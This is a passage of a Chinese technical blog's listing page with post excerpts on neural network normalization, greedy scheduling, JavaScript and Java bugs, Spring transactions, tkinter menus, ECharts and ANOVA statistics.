4.神经网络 归一化是为了加快训练网络的收敛性，可以不进行归一化处理 归一化的具体作用是归纳统一样本的统计分布性。归一化在0-1之间是统计的概率分布，归一化在**-1–+1之间是统计的坐标分布。归一化有同一、统一和合一的意思。无论是为了建模还是为了计算，首先基本度量单位要同一，神经网络是以样本在事件中的统计分别几率来进行训练（概率计算）和预测的，归一化是同一在0-1**之间的统计概率分布；
当所有样本的输入信号都为正值时，与第一隐含层神经元相连的权值只能同时增加或减小，从而导致学习速度很慢。为了避免出现这种情况，加快网络学习速度，可以对输入信号进行归一化，使得所有样本的输入信号其均值接近于0或与其均方差相比很小。
归一化是因为sigmoid函数的取值是0到1之间的，网络最后一个节点的输出也是如此，所以经常要对样本的输出归一化处理。所以这样做分类的问题时用[0.9
0.1 0.1]就要比用[1 0 0]要好。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b047691a59a6ee2dab58ef0c1c4fc27b/" rel="bookmark">
			活动安排问题-贪心
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 问题描述 活动安排问题就是要在所给的活动集合中选出最大的相容活动子集合，是可以用贪心算法有效求解的很好例子。
该问题要求高效地安排一系列争用某一公共资源的活动。
贪心算法使得尽可能多的活动能兼容地使用公共资源。
设有n个活动的集合E={1,2,…,n}，其中每个活动都要求使用同一资源，如演讲会场等，而在同一时间内只有一个活动能使用这一资源。
每个活动i都有一个要求使用该资源的起始时间si和一个结束时间fi, 且si &lt;fi 。
如果选择了活动i，则它在[si, fi)内占用资源。
若[si, fi)与[sj, fj)不相交，则称活动i与j是相容的。即当si≥fj或sj≥fi时，活动i与活动j相容。
活动安排问题就是求E={1,2,…,n}的最大相容活动子集。
问题分析 用数组A分别存放所有活动的起始时间、结束时间以及是否予以安排的标记。某项活动结束时间愈早，安排其它活动的剩余区间愈大。所以贪心策略为尽量选择结束时间早的活动来安排。为此，将数组中的活动按结束时间的非减顺序排序，即f1≤f2≤…≤fn。显然排序需要的时间为O(nlogn)。
核心算法 template&lt;class Type&gt; void GreedySelector(int n, Type s[ ], Type f[ ], bool A[ ]) { A[1]=true; int j=1; for (int i=2;i&lt;=n;i++) { if (s[i]&gt;=f[j]) { A[i]=true; j=i; } else A[i]=false; } } 由于输入的活动以其完成时间的非减序排列，所以算法greedySelector每次总是选择具有最早完成时间的相容活动加入集合A中。算法贪心选择的意义是使剩余的可安排时间段极大化，以便安排尽可能多的相容活动。当输入的活动已按结束时间的非减序排列，算法只需O(n)的时间安排n个活动，使最多的活动能相容地使用公共资源。如果所给出的活动未按非减序排列，可以用O(nlogn)的时间重排。
例子 设待安排的11个活动的开始时间和结束时间，按结束时间的非减序排列如下：
若被检查的活动i的开始时间si小于最近选择的活动j的结束时间fi，则不选择活动i，否则选择活动i加入集合A中。贪心算法并不总能求得问题的整体最优解。但对于活动安排问题，greedySelector却总能求得的整体最优解，即它最终所确定的相容活动集合A的规模最大。这个结论可以用数学归纳法证明。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/522a42dd9d19843a6a739276a63f030d/" rel="bookmark">
			javascript解决【Uncaught TypeError: Cannot read property ‘style‘ of undefined at HTMLHeadingElement.】问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、首先我随机选取的一种存在此问题的代码，其代码如下： var aList = document.querySelectorAll(".F-nav-li h2");
var aHide = document.querySelectorAll(".F-hide-1");
for(var i = 0; i &lt; aList.length; i++){ // 从哪来 到哪结束 怎么去
aList[i].onclick = function(){ // 鼠标点击事件
console.log("你是个牛"，i); aHide[i].style.height = "125px";//此时会产生报错，报错原因是由于i的取值越界了！
}
}
2、当你运行完成并且点击的时候相应的按键时，会出现如下问题，如图： 3、这i的取值超过了aList.length！这是为什么？通常将这类问题称为【取值越界问题】！ 产生原因：由于浏览器在解析js文件时，是从上至下进行解析。但是在js中有一种情况例外，就是鼠标点击事件。因为在网页运行出来后，点击事件不会被执行。 如上图中当浏览器解释到for循环中的onclick时，就终止了，然后把相应的信息存放在方框内，然后一直循环，知道【i=aList.length】不满足循环条件时，跳出循环；然后，向下继续执行，因此造成了此类问题！ 4、此类问题的解决方法有很多种，下面仅仅列出一种方法，希望对大家有帮助！ var aList = document.querySelectorAll(".F-nav-li h2");
var aHide = document.querySelectorAll(".F-hide-1");
for(var i = 0; i &lt; aList.length; i++){ // 从哪来 到哪结束 怎么去
/*
第一次循环： aList[0].index = 0; 第二次循环： aList[1].index = 1; 第三次循环： aList[2].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/522a42dd9d19843a6a739276a63f030d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/847be15e97b6420492975339f367e083/" rel="bookmark">
			力扣解题思路：区间排序问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		435. 无重叠区间 思路：每次遇到和区间有关的题都要思考半天区间的排序方法，是根据区间左边排序还是根据区间右边排序呢？ 另外遇到这种题目如果采取贪心算法最后的结果会不会是最优的呢？（主要是因为研究生期间我的研究方向是强化学习算法，其中用到的贪婪算法容易陷入局部最优，所以每次看到适合用贪婪算法解题的题目时总会思考贪婪算法会得出最优解吗？）-&gt; 首先，分析我们的目标是要找到找到需要移除区间的最小数量，所以想到贪心算法：先计算最多能组成的不重叠区间个数，然后用区间总个数减去不重叠区间的个数。此时就应该先排序，那么如何排序呢？-&gt; 按区间的结尾进行升序排序，每次选择结尾最小，并且和前一个区间不重叠的区间。因此我们按照区间结尾来使用lambda表达式排序。 在每次选择中，选择的区间结尾越小，留给后面的区间的空间越大，那么后面能够选择的区间个数也就越大。自然这样贪心算法并不会到达局部最优，这就是按区间的结尾进行升序排序的根本原因。排序代码如下：
Arrays.sort(intervals,(o1,o2)-&gt;(o1[1]-o2[1])); 完整代码如下：
class Solution { public int eraseOverlapIntervals(int[][] intervals) { if(intervals.length == 0) return 0; Arrays.sort(intervals,(o1,o2)-&gt;(o1[1]-o2[1])); int end = intervals[0][1]; int count = 1; for(int i=1;i&lt;intervals.length;i++){ if(intervals[i][0]&gt;=end){ count++; end = intervals[i][1]; } } return intervals.length-count; } } 452. 用最少数量的箭引爆气球 同样的道理，如452. 用最少数量的箭引爆气球，使用的也是同样的思想，只不过此时边界重叠也必须算在作重叠区间，使用lambda表达式排序： Arrays.sort(points,(o1,o2)-&gt;(o1[1]-o2[1])); 完整代码如下：
class Solution { public int findMinArrowShots(int[][] points) { if(points.length == 0) return 0; Arrays.sort(points,(o1,o2)-&gt;(o1[1]-o2[1])); int end = points[0][1]; int count = 1; for(int i=1;i&lt;points.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/847be15e97b6420492975339f367e083/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fadd0e9eb9490a4f77fecdedb75dadef/" rel="bookmark">
			spring事务传播总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 事务传播机制 场景：serviceA.methodA调用serviceB.methodB，A和B方法本 身都已经被添加了事务控制，那么A调用B的时候，就需要进行事务的一些协商传播级别是针对serviceB.methodB设置，serviceA.methodA保持默认即可，如果对A设置不当（SUPPORTS）当前事务还会失效,继而影响B的事务。同一个service中的方法互相调用，被调用方法事务不生效。spring事务是通过代理对象对方法增强来管理事务的，同一个service中通过一个方法调用另外一个方法，是通过目标对象this引用调用的，目标对象自身并没有事务管理功能。此时被调用的方法事务不起作用，设置传播级别更没有意义。 事务传播级别 REQUIRED 支持当前事务，如果当前没有事务，则新建事务如果当前存在事务，则加入事务，合并成一个事务 \B有事务B无事务A有事务A或B异常，A和B都回滚A或B异常，A和B都回滚A无事务A异常，A和B都不回滚，B异常 A不回滚，B回滚A或B异常，A和B都不回滚 SUPPORTS 如果当前存在事务，则加入事务如果当前不存在事务，则以非事务方式进行 \B有事务B无事务A有事务A或B异常，A和B都回滚A或B异常，A和B都回滚A无事务A或B异常，A和B都不回滚A或B异常，A和B都不回滚 MANDATORY 如果当前存在事务，则运行在当前事务中如果当前无事务，则抛异常，也即父级方法必须有事务 \B有事务B无事务A有事务A或B异常，A和B都回滚A或B异常，A和B都回滚A无事务抛异常抛异常 REQUIRES_NEW 新建事务，如果当前存在事务，则把当前事务挂起这个方法会独立提交事务，不受调用者（父方法）的事务影响，即使父方法异常，他也能正常提交 \B有事务B无事务A有事务A异常：A回滚，B不回滚，B异常：A和B都回滚A或B异常，A和B都回滚A无事务A异常：A和B都不回滚，B异常 ：A不回滚，B回滚A或B异常，A和B都不回滚 NOT_SUPPORTS 以非事务方式进行如果当前存在事务 ，则把当前事务挂起， \B有事务B无事务A有事务A或B异常：A都回滚，B都不回滚A或B异常，A和B都回滚A无事务A或B异常，A和B都不回滚A或B异常，A和B都不回滚 NEVER 以非事务方式运行，如果当前存在事务，则抛出异常，即父级方法必须无事务 ，很少使用 \B有事务B无事务A有事务抛异常抛异常A无事务A或B异常，A和B都不回滚A或B异常，A和B都不回滚 NESTED 如果当前存在事务，它将会成为父级的一个子事务，方法结束后并没有提交，只是等待父事务结束才提交如果当前没有事务，则新建事务如果它本身异常，父级可以捕获到它的异常，而不进行回滚。正常提交但是如果父级异常，它必然回滚这就是和上面REQUIRES_NEW的区别 \B有事务B无事务A有事务A或B异常，A和B都回滚A或B异常，A和B都回滚A无事务A异常：A和B都不回滚，B异常 ：A不回滚，B回滚A或B异常，A和B都不回滚 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b01aea75138f41d6d5aa88df25e7b7d8/" rel="bookmark">
			tkinter-menu详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本片文章详细的介绍tkinter的菜单控件。通过学习本篇文章，你将完全掌握tkinter中菜单的使用。废话不多说，开始干货。
概念 在介绍tkinter菜单之前，我先会介绍3个概念以及这3个概念之间的关系。以便更好的理解后文的表述。
菜单栏(menu bar)、菜单(menu)、菜单项(menu item)，三者之间的层次关系如下：
下面这个实例图，更加的直观：
对于菜单栏(menu bar)来讲，菜单(menu)是其"菜单项"；对于菜单(menu)来讲，菜单项(menu item)是其"菜单项"。其实代码层面上就只有menu和menu item的概念，这里增加了一个菜单栏的逻辑概念是为了方便表述。
在创建菜单栏(menu bar)时，它的master是主窗口对象，然后通过主窗口对象的config函数将两者(菜单栏、主窗口)关联起来；在创建菜单(menu)时，这个菜单是 ‘menu’ 还是 ‘menu item’，根据不同的业务需求都是可以实现的。通常来讲，这个菜单对应的是’menu’，就像上图中的Edit菜单，它就是一个’menu’对象，它的master是菜单栏(menu bar)。Edit菜单的菜单项(menu item)是通过相应的方法(后面会具体介绍)将其与菜单关联起来；使用不同的关联方法，菜单的显示效果不同。可能初次看完这段表述，不能完全理解，没关系，继续往下看，等看完后面的实际代码的例子，再回过头来看这段话，就能完全明白了。
菜单(menu) 创建菜单控件 class Menu(master, cnf=..., **kw) master 表示父窗口或父菜单 kw 表示菜单控件的各种属性选项 菜单属性 下面介绍菜单的14种属性
属性作用activebackgroundThe background color that will appear on a choice when it is under the mouse.
设置活动背景色。当鼠标移动到菜单选项上时，该菜单项的背景色。activeborderwidthSpecifies the width of a border drawn around a choice when it is under the mouse. Default is 1 pixel.
设置活动边框宽度。当鼠标移动到菜单选项上时，以指定宽度显示该选项的边框。默认宽度是一个像素。最终的效果就是菜单选项的宽度改变。activeforegroundThe foreground color that will appear on a choice when it is under the mouse.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b01aea75138f41d6d5aa88df25e7b7d8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0ef72f5c3516cbf3b8f77b6bfd68ce55/" rel="bookmark">
			echart柱状图Y轴最小间隔问题,Y轴不显示小数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天来说说echart 柱状图 Y轴的最小值、间隔问题。
最近项目中用到柱状图，数据量少的时候，Y轴会出现小数，但是我们产品小哥哥说不能出现小数，好了，那就开干！
option = { xAxis: { type: 'category', data: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'] }, yAxis: { type: 'value', }, series: [{ data: [0, 1, 0, 2, 0, 0, 0], type: 'bar' }] }; 设置最小刻度跟间隔不就可以实现了吗？
查阅官方文档，找到Y轴以下两个配置
1、yAxis.min ：坐标轴刻度最小值。
2、yAxis.minInterval： 自动计算的坐标轴最小间隔大小。
于是我就给加上了这两个配置项，运行结果是Y轴确实是不出现小数了，但是发现问题没有！！，周二那条数量为1的柱子不见啦！
option = { xAxis: { type: 'category', data: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'] }, yAxis: { type: 'value', min:1, minInterval:1, }, series: [{ data: [0, 1, 0, 2, 0, 0, 0], type: 'bar' }] }; 认真看了下，Y轴不是从0开始，而是从1开始了，所以数量为1的柱子就“不见”了，删掉min配置，即可。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0ef72f5c3516cbf3b8f77b6bfd68ce55/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5af2b27b43c1772f0eaa76017b4fdfc5/" rel="bookmark">
			统计学—方差分析概要
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		起源：方差分析是在20世纪20年代发展起来的一种统计方法.它是由英国统计学家费希尔在进行试验设计时为解释试验数据而首先引入的。目前。方差分析方法广泛用于分析心理学、生物学、工程和医药领域的试验数据。从形式上看.方差分析是比较多个总体的均值是否相等，但本质上它所研究的是变量之间的关系。
一、方差分析基本概念 文章目录 一、方差分析基本概念1、为什么使用方差分析来研究？2、方差分析中的重要术语3、方差分析的基本思想与原理4、误差分析5、方差分析中的基本假定 二、单因素方差分析1、生成出基本数据结构2、分析步骤2.1 提出假设2.2 构造检验的统计量 3、关系强度的测量4、方差分析中的多重比较5、非参检验 三、双因素方差分析1、无交互作用的双因素方差分析1.1 数据结构1.2 分析步骤1.3 关系强度的测量 2、有交互作用的双因素方差分析3、R语言实战 四、参考资料 1、为什么使用方差分析来研究？ 2、方差分析中的重要术语 因素或因子：在方差分析中，所要检验的对象称为因素或因子；
水平或处理：因素的不同表现称为水平或处理；
观测值：在每个因子水平下得到的样本数据称为观测值；
正如上例所显示的，要分析行业对被投诉次数是否有显著影响。这里的行业是要检验的对象，称为因素或因子；零售业、旅游业、航空公司、家电制造业是行业这一因素的具体表现，称为水平或处理：在每个行业下得到的样本数据（被投诉次数）称为观测值。由于这里只涉及行业一个因素，因此称为单因素4水平的试验。因素的每一个水平可以看做一个总体，如零售业、旅游业、航空公司、家电制造业可以看做4个总体，上面的数据可以看做从这4个总体中抽取的样本数据。
在单因素方差分析中，通常涉及两个变量：一个是分类型自变量，一个是数值型因变量。在上例中，行业就是自变量，并且是个分类型变量；而零售业、旅游业等就是行业这个自变量的具体取值，称为行业这个因素的水平或处理。被投诉次数是因变量，并且还是个数值型变量，不同的被投诉次数就是因变量的取值。方差分析就是要研究行业对被投诉次数是否有显著影响。
3、方差分析的基本思想与原理 据上例，我们需要判断的是行业对被投诉次数是否有显著影响的问题；通常我们需要画出散点图来进行一个总体的判断，从散点图中可以看到是有一定差异的；但我们需要知道的是这种差异有可能是由抽样的随机性造成的，因此，我们需要更准确的方法来检验这种差异是否显著，也就是进行方差分析。之所以叫方差分析，是因为虽然人们感兴趣的是均值，但在判断均值之间是否有差异时需要借助于方差。同时也表示，它是通过对数据误差来源的分析来判断不同总体的均值是否相等，进而分析自变量对因变量是否有显著影响。
组内误差：来自水平内部的数据误差一般称为组内误差，它反映了一个样本内部数据的离散程度。显然，组内误差只含有随机误差。如上例，零售业中所抽取的7家企业被投诉次数之间的误差就是组内误差。
组间误差：不同水平之间的数据误差成为组间误差。这种差异可能是由于抽样本身形成的随机误差，也可能是由于行业本身的系统性因素造成的系统误差。因此，组间误差是随机误差和系统误差的总和。例如，四个行业被投诉次数之间的误差就是组间误差，它反映了不同样本之间数据的离散程度。
总平方和：反映全部数据误差大小的平方和称为总平方和，记为SST。
组内平方和：反映组内误差大小的平方和称为组内平方和，也称为残差平方和，记为SSE。
组间平方和：反映组间误差大小的平方和称为组间平方和，也称为因素平方和，记为SSA。
总误差（SST）=组内误差（SSE）+组间误差（SSA）
4、误差分析 1、如果不同行业对被投诉次数没有影响，那么组件误差与组内误差经过平均后的数值（称为均方或方差）就应该很接近，它们比值机会接近为1
2、如果不同行业对被投诉次数有影响，那么组间误差平均后的数值就会大于组内误差平均后的数值，它们之间的比值就会大于1.当这个比值达到某种程度时，就认为因素的不同水平之间存在显著差异，也就是自变量对因变量有显著影响。
5、方差分析中的基本假定 1、每个总体都应服从正态分布
2、各个总体的方差必须相同
3、观测值是独立的
二、单因素方差分析 1、生成出基本数据结构 2、分析步骤 2.1 提出假设 如果拒绝原假设H0，则意味着自变量对因变量有显著影响，也就是自变量与因变量之间有显著关系；如果不拒绝原假设H0，则没有证据表明自变量与因变量之间有显著关系。
2.2 构造检验的统计量 组内平方和： 组间平方和：
总平方和：
由于各误差平方和的大小与观测值的多少有关，为了消除观测值多少对误差平方和大小的影响，需要将其平均，也就是用各平方和除以它们所对应的自由度，这一结果称为均方或方差。
由于我们要比较的是组间均方和组内均方之间的差异，所以通常只计算SSA的均方和SSE的均方。其计算公式分别为：
将MSA与MSE进行对比，即得到所需要的检验统计量F。当H0为真时，二者的比值服从分子自由度为k-1、分母自由度为n-k的F分布，即
判断依据：判断因素的水平是否对观测值有显著影响，实际上也就是比较组间方差与组内方差之间差异的大小。那么，它们之间的差异达到什么程度才表明有系统误差存在呢？这就需要用检验统计量进行判断。将统计量的值F与给定的显著性水平a下的临界值Fa进行比较，从而做出对原假设H0的决策。
根据给定的显著性水平a，在F分布表中查找临界值Fa（k-1，n-k）
若统计量F&gt;Fa，则拒绝原假设
若统计量F&lt;Fa，则不拒绝原假设
总的来说，最后需要通过计算生成出这样一张方差分析表
3、关系强度的测量 以上的计算方差分析结果可以判断出自变量对因变量是否有显著影响，但到底影响程度是多少却没有直观显示，这就需要进一步对关系强度进行测量。
测量方法：用组间平方和（SSA）占总平方和（SST）的比例大小来反映，将这一比例记为R2，即
R2的平方根就可以用来测量自变量与因变量之间的关系强度。
4、方差分析中的多重比较 在我们判断出不同行业被投诉次数的均值不完全相同的时候，我们需要进一步比较这些差异到底是出现在哪些行业当中的，此时我们就需要使用多重比较方法，它是通过对总体均值之间的配对比较来进一步检验到底哪些均值之间存在差异。
多重比较方法有许多种，我们一般使用费希尔提出的最小显著差异方法，缩写为LSD方法，具体步骤有：
5、非参检验 三、双因素方差分析 当方差分析中涉及到两个分类型自变量时候，称为双因素方差分析。以不同品牌的彩电在不同地区的销售量情况作为案例，其中品牌与地区便是两个分类型自变量，销售量就是最终的观测值。如果品牌与地区对销售量的影响是相互独立的，那么此时的双因素方差分析称为无交互作用；如果某个地区对某种品牌有特殊偏好，这就是两个因素结合后产生的新效应，这时的双因素方差分析称为有交互作用的双因素方差分析
1、无交互作用的双因素方差分析 1.1 数据结构 由于双因素方差分析有两个因素，因此在获取数据的时候，需要将一个因素安排在行的位置，称为行因素；而另一个因素安排在列位置，称为列因素，具体数据结构图如下图所示：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5af2b27b43c1772f0eaa76017b4fdfc5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/53ca1b434b2bb5acafd9c2a53a095e77/" rel="bookmark">
			机器人理论基础 Chapter 1 - Introduction
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们从最基础入手，首先开始的是对工业机器人（移动性和自动化）进行简单的介绍，相关参考资料的推荐，然后做机器人系统和机器人模拟器的相关了解。
大规模公司才使用机器人，毕竟一个普通的机器人60万，更贵的还有啊。机器人提高生产力增加品质，还可以在危险的环境下工作，1998年7月4日机器人登陆火星。
1998年7月4日，美国“火星探路者”宇宙飞船经过4亿多公里的航行，成功地登陆火星并释放了一个机器人在火星探察。在这次被称为人类迄今最成功的星际探测计划之一的活动中，“火星探路者”共向地面传回26亿比特的科学信息，1.6万幅图片及对火星岩石和土壤进行了1.5万份完整的化学分析。
机器人的使用可以和电脑有很多的联系，物联网工业4.0提倡把所有的机器人都连接上。冰箱可以上网，联络到各大卖场，缺少什么物资就发个消息。电脑辅助系统，用电脑先模拟一遍，分析一遍。工作空间的探索，看真实和虚拟世界的误差，矫正工作事先做。首先我们来分析工作空间，比如人的手臂，静力结构分析，看漏洞在哪里？看看设计的路径是否符合要求，确认运动从各个方面都是可行的能实现的。
机器人领域创业的情况，XBOTPARK训练营里获得的信息：
最开始机器人进入家庭，是irobot麻省理工导师研究生3人组的扫地机器人产品(基于美国有地毯的背景，吸尘)，国内有很多山寨版。云鲸智能，适应国内地面多数为瓷砖的特点，它设计的是高速旋转紧压地面的拖布，有戴森的味道，科技创造良好用户体验，用10倍性能提升买3倍的价钱。2015年时，小米，iRobot,Dyson,科沃斯都有类似的家庭用产品，云鲸有机会吗？扫地机器人产品已经有很多了，但对于拖地，用户还是有痛点的，做产品调研和用户调研以及清洁测式。15年初创3个人，今天500人(产品研发时间轴)。智能算法如建图算法，困难部位补扫，房间切割，最优化清洁路径，即时重定位。
对于用户痛点，我们如何去抓住机会？以现代厨房为例，自我代入产品使用去思考。创业是来源于生活的。
SwitchBot卧安科技，立足于IoT智能家居领域，(拉窗帘神器，传统窗帘配备上一个灵活的switchbot控制器，开窗帘机器人)，传说卧安一年做10几款产品，智能终端APP控制。换位思考，不以健康人角度，以残疾人，老人代入思考。比同类型产品更简单，用户更喜欢。卧安07年核心团队形成。
学院派创业 美国的学院派创业者，XBOTPARK松山湖机器人部落的初衷，14年3位老师创立。
工业类公司的创立比较苛刻，但是智能C端还算友好。团队案例电动船外机（机电一体+智能）水下机器人欧洲市场占有率比较大。也有面向B端的创业公司，海柔创新。李群自动化轻量级工业机器人，控制和本体一体化。Best innovation of the year 时代周刊评选基地有2个入选。年轻人在智能C端的创业是有优势的。
新制造：C端硬科技品牌的孵化 大湾区制造业40年首先是代工时代，20世纪80年代，手机，电脑，pad，智能音箱，20世纪初山寨企业被干掉，通讯企业巨头被苹果公司干掉后的思考
转型升级之路：1990s-2000s，创业者年龄40岁左右（华为，中兴，TCL），市场敏感，资源整合能力很强，在产品定义上没有创新。代工企业（类似机械加工）的利润越来越薄，在往东南亚转移。
制造业生态，B端企业困境和C端企业挑战 B端公司缺乏技术，缺乏品牌，我们来看客户的客户，机床厂子，零部件核心技术比较弱。
C端企业挑战：定义了行业规矩的不是我们，是苹果是三星，华为的毛利在5G，基站，单独看C端，是不行的。
看戴森的模式，戴森比赛的获奖团队一般是在校学生，由于没有经验，没有约束，也就敢于颠覆。给政府的产业是G端，对公司B端也很难办，年轻人还是搞C端比较容易，先从C端产品开始做起，建立品牌，影响力后，再走B端，带动材料，芯片，工厂，以前我们是用外部的C端来代替火车头拉动产业链。现在我们来打造自己家的C端。
机遇列举 1.中国消费群体的崛起，2.物联网与智能时代（机器人时代）3.大湾区优势：设计产业，零部件生产商，样机制造，大规模生产，物流体系，产业工人和管理者，配套设施，供应链资源优势。4.市场需求与科技融合创造极致的用户体验。传统的设计学院和传统的理工科培养的人才。5.新工科教育：Education is not the filling of a pail,but the lighting of a fire.高等教育发展演变，从知识经济到创新经济的演变。学生应该在舞台，老师是辅助，学生要有自己的内在驱动力，构思一个好的想法。
C端产品生态链 消费者心理（痛点，价值观）-产品定义（设计思维，客户调研，问题的收集和定义）-研发（R&amp;D）-生产（B端企业优势资源）-渠道（平台）-服务；新工科教育，孵化平台
希腊神庙为甚千年不倒？C端产品的基石
XbotPARK,从幼儿园就开始有机器人教育
技术门槛不高的话，被抄袭的可能性是很大的。智能家具创业是传统家具公司转型？
今日写文背景音乐《一场恋爱》
长发落寞
如你看着我
思念诉说
眼神多像云朵
这一场恋爱
我期待的女孩
她身影清澈
多么晶莹的无奈
这一场恋爱
过去和现在
无论晴朗破碎
总会有一转身的等待
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a946a1b33f4ba31d66cac4e328fa2bd1/" rel="bookmark">
			自定义数组排序中遇到的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近几次在使用Array.sort()函数对数组自定义排序的时候遇到了一个问题，出现问题的代码如下：
int[] c = new int[10]; for(int i=0;i&lt;10;i++) c[i] = i; Arrays.sort(c, new Comparator&lt;int&gt;(){ @Override public int compare(int a, int b){ int c1 = bitCount(a); int c2 = bitCount(b); return c1 == c2 ? a - b : c1 - c2; } }); 这段代码一直报错，开始我想的是我用这种方式给String数组排序（按照字符串长度排序）的时候并不会报错，后来查到原因是，这种形式并不支持基本数据类型，于是我把Comparator接口中的int和compare方法中的int改成了integer这种包装器类型：
Integer[] c = new Integer[10]; for(int i=0;i&lt;10;i++) c[i] = i; Arrays.sort(c, new Comparator&lt;Integer&gt;(){ @Override public int compare(Integer a, Integer b){ int c1 = bitCount(a); int c2 = bitCount(b); return c1 == c2 ?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a946a1b33f4ba31d66cac4e328fa2bd1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/344c469dfd272f40e04b8dc17263df0f/" rel="bookmark">
			4. 方差分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		方差分析 1 概要 方差分析(Analysis of variance, ANOVA) 主要研究分类变量作为自变量时，对因变量的影响是否是显著的。
方差分析的方法是由20世纪的统计学家Ronald Aylmer Fisher在1918年到1925年之间提出并陆续完善起来的，该方法刚开始是用于解决田间实验的数据分析问题，因此，方差分析的学习是和实验设计、实验数据的分析密不可分的。
实验设计和方差分析都有自己相应的语言。因此，在这里我们通过一个焦虑症治疗的实例，先了解一些术语，并且思考一下，方差分析主要用于解决什么样的问题。
以焦虑症治疗为例，现有两种治疗方案：认知行为疗法（CBT）和眼动脱敏再加工法（EMDR）。我们招募10位焦虑症患者作为志愿者，随机分配一半的人接受为期五周的CBT，另外一半接受为期五周的EMDR，设计方案如表1-1所示。在治疗结束时，要求每位患者都填写状态特质焦虑问卷（STAI），也就是一份焦虑度测量的自我评测报告。
表1-1 单因素组间方差分析
CBTEMDRs1s6s2s7s3s8s4s9s5s10 在这个实验设计中，治疗方案是两水平（CBT、EMDR）的组间因子。之所以称其为组间因子，是因为每位患者都仅被分配到一个组别中，没有患者同时接受CBT和EMDR。表中字母s代表受试者（患者）。STAI是因变量，治疗方案是自变量。由于在每种治疗方案下观测数相等，因此这种设计也称为均衡设计（balanced design）；若观测数不同，则称作非均衡设计（unbalanced design）。
因为仅有一个类别型变量，表1的统计设计又称为单因素方差分析（one-way ANOVA），或进一步称为单因素组间方差分析。方差分析主要通过F检验来进行效果评测，若治疗方案的F检验显著，则说明五周后两种疗法的STAI得分均值不同。
假设你只对CBT的效果感兴趣，则需将10个患者都放在CBT组中，然后在治疗五周和六个月后分别评价疗效，设计方案如表1-2所示。
表1-2 单因素组内方差分析
时间患者5周6个月s1s2s3s4s5s6s7s8s9s10 此时，时间（time）是两水平（五周、六个月）的组内因子。因为每位患者在所有水平下都进行了测量，所以这种统计设计称单因素组内方差分析；又由于每个受试者都不止一次被测量，也称作重复测量方差分析。当时间的F检验显著时，说明患者的STAI得分均值在五周和六个月间发生了改变。
现假设你对治疗方案差异和它随时间的改变都感兴趣，则将两个设计结合起来即可：随机分配五位患者到CBT，另外五位到EMDR，在五周和六个月后分别评价他们的STAI结果（见表1-3）。
表1-3 含组间和组内因子的双因素方差分析
时间疗法患者5周6个月CBTs1s2s3s4s5EMDRs6s7s8s9s10 疗法（therapy）和时间（time）都作为因子时，我们既可分析疗法的影响（时间跨度上的平均）和时间的影响（疗法类型跨度上的平均），又可分析疗法和时间的交互影响。前两个称作主效应，交互部分称作交互效应。
当设计包含两个甚至更多的因子时，便是因素方差分析设计，比如两因子时称作双因素方差分析，三因子时称作三因素方差分析，以此类推。若因子设计包括组内和组间因子，又称作混合模型方差分析，当前的例子就是典型的双因素混合模型方差分析。
本例中，你将做三次F检验：疗法因素一次，时间因素一次，两者交互因素一次。若疗法结果显著，说明CBT和EMDR对焦虑症的治疗效果不同；若时间结果显著，说明焦虑度从五周到六个月发生了变化；若两者交互效应显著，说明两种疗法随着时间变化对焦虑症治疗影响不同（也就是说，焦虑度从五周到六个月的改变程度在两种疗法间是不同的）。
现在，我们对上面的实验设计稍微做些扩展。众所周知，抑郁症对病症治疗有影响，而且抑郁症和焦虑症常常同时出现。即使受试者被随机分配到不同的治疗方案中，在研究开始时，两组疗法中的患者抑郁水平就可能不同，任何治疗后的差异都有可能是最初的抑郁水平不同导致的，而不是由于实验的操作问题。抑郁症也可以解释因变量的组间差异，因此它常称为混淆因素（confounding factor）。由于你对抑郁症不感兴趣，它也被称作干扰变数（nuisance variable）。
假设招募患者时使用抑郁症的自我评测报告，比如白氏抑郁症量表（BDI），记录了他们的抑郁水平，那么你可以在评测疗法类型的影响前，对任何抑郁水平的组间差异进行统计性调整。本案例中，BDI为协变量，该设计为协方差分析（ANCOVA）。
